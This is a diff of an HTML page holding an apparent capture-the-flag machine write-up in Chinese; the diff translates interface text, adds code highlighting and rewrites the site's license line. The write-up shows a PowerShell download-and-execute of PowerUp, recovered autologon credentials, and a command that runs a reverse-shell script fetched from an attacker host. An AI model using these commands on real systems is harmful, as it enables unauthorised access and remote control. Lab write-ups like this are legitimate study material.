@@ -150,7 +150,7 @@
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                 <i class="icon icon-lg icon-chevron-left"></i>
             </a>
-            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="検索">
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                 <i class="icon icon-lg icon-search"></i>
             </a>
@@ -284,7 +284,7 @@
             </figure>
 
 <h1 id="提权信息"><a href="#提权信息" class="headerlink" title="提权信息"></a>提权信息</h1><h2 id="预期"><a href="#预期" class="headerlink" title="预期"></a>预期</h2><p>powerup可以发现注册表中的密码</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">IEX (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">'http://10.10.14.6:7777/PowerUp.ps1'</span>)</span><br><span class="line">Invoke-AllChecks</span><br><span class="line"></span><br><span class="line">[*] Checking <span class="keyword">for</span> Autologon credentials <span class="keyword">in</span> registry...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DefaultDomainName    :</span><br><span class="line">DefaultUserName      : Alfred</span><br><span class="line">DefaultPassword      : Welcome1!</span><br><span class="line">AltDefaultDomainName :</span><br><span class="line">AltDefaultUserName   :</span><br><span class="line">AltDefaultPassword   :</span><br></pre></td></tr></table></figure>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">IEX (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">'http://10.10.14.6:7777/PowerUp.ps1'</span>)</span><br><span class="line"><span class="built_in">Invoke-AllChecks</span></span><br><span class="line"></span><br><span class="line">[*] Checking <span class="keyword">for</span> Autologon credentials <span class="keyword">in</span> registry...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DefaultDomainName    :</span><br><span class="line">DefaultUserName      : Alfred</span><br><span class="line">DefaultPassword      : Welcome1!</span><br><span class="line">AltDefaultDomainName :</span><br><span class="line">AltDefaultUserName   :</span><br><span class="line">AltDefaultPassword   :</span><br></pre></td></tr></table></figure>
 
 <p>这个密码就是管理员密码</p>
 <h2 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h2><p>权限配置错误，Alfred对root.txt没有权限，但对Desktop有权限：</p>
@@ -306,7 +306,7 @@
             </figure>
 
 <h2 id="Administrator"><a href="#Administrator" class="headerlink" title="Administrator"></a>Administrator</h2><p>使用密码得到Administrator session,执行reverse shell:</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$passwd</span> = <span class="built_in">ConvertTo-SecureString</span> <span class="string">'Welcome1!'</span> -AsPlainText -Force;</span><br><span class="line"><span class="variable">$creds</span> = <span class="built_in">New-Object</span> System.Management.Automation.PSCredential(<span class="string">'administrator'</span>,<span class="variable">$passwd</span>);</span><br><span class="line"><span class="built_in">Start-Process</span> -FilePath <span class="string">"powershell"</span> -argumentlist <span class="string">"IEX(New-Object Net.webClient).downloadString('http://10.10.14.6:7777/Invoke-PowerShellTcp.ps1')"</span> -Credential <span class="variable">$creds</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$passwd</span> = <span class="built_in">ConvertTo-SecureString</span> <span class="string">'Welcome1!'</span> <span class="literal">-AsPlainText</span> <span class="literal">-Force</span>;</span><br><span class="line"><span class="variable">$creds</span> = <span class="built_in">New-Object</span> System.Management.Automation.PSCredential(<span class="string">'administrator'</span>,<span class="variable">$passwd</span>);</span><br><span class="line"><span class="built_in">Start-Process</span> <span class="literal">-FilePath</span> <span class="string">"powershell"</span> <span class="literal">-argumentlist</span> <span class="string">"IEX(New-Object Net.webClient).downloadString('http://10.10.14.6:7777/Invoke-PowerShellTcp.ps1')"</span> <span class="literal">-Credential</span> <span class="variable">$creds</span></span><br></pre></td></tr></table></figure>
 
 <figure class="image-bubble">
                 <div class="img-lightbox">
@@ -339,7 +339,7 @@
     <div class="content">
         
 <span class="post-time">
-    最終更新：<time datetime="2021-02-08T06:36:34.747Z" itemprop="dateUpdated">2021-02-08 14:36:34</time>
+    Last updated: <time datetime="2021-02-08T06:36:34.747Z" itemprop="dateUpdated">2021-02-08 14:36:34</time>
 </span><br>
 
 
@@ -506,7 +506,7 @@
             
                 <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
             
-            <span>このブログの内容物は<a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.ja" target="_blank">クリエイティブ・コモンズ 表示 - 非営利 - 継承 4.0 国際ライセンスの下に提供されています</a></span>
+            <span>This blog is licensed under a <a rel="license noopener" href="https://creativecommons.org/licenses/by/4.0/" target="_blank">Creative Commons Attribution 4.0 International License</a>.</span>
         </p>
     </div>
     <div class="bottom">
